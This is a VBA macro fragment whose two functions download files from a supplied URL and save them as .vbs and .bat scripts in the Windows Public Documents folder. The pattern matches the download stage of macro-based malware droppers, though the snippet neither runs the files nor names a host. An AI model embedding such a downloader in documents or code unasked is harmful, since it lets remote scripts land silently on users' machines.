' get the VBScript file from Server
Function GetVBSfromServer(Url As String)
    Dim xHttp
    Dim bStrm
    Dim filename
    Set xHttp = CreateObject("Microsoft.XMLHTTP")

    xHttp.Open "GET", Url, False
    xHttp.Send
    Set bStrm = CreateObject("Adodb.Stream")
    With bStrm
        .Open
        .Type = 1 '//binary
        .write xHttp.responseBody
        .SaveToFile "C:\Users\Public\Documents\VBS_MACRO", 2 '//overwrite
        .Close
    End With
    Name "C:\Users\Public\Documents\VBS_MACRO" As "C:\Users\Public\Documents\VBS_MACRO.vbs"
End Function

'get the bat file from the server
Function GetBATfromServer(Url As String)
    Dim xHttp
    Dim bStrm
    Dim filename
    Set xHttp = CreateObject("Microsoft.XMLHTTP")
    xHttp.Open "GET", Url, False
    xHttp.Send
    Set bStrm = CreateObject("Adodb.Stream")
    With bStrm
        .Open
        .Type = 1 '//binary
        .write xHttp.responseBody
        .SaveToFile "C:\Users\Public\Documents\BAT_EXCEL_VBS_MACRO", 2 '//overwrite
        .Close
    End With
     Name "C:\Users\Public\Documents\BAT_EXCEL_VBS_MACRO" As "C:\Users\Public\Documents\BAT_EXCEL_VBS_MACRO.bat"
End Function
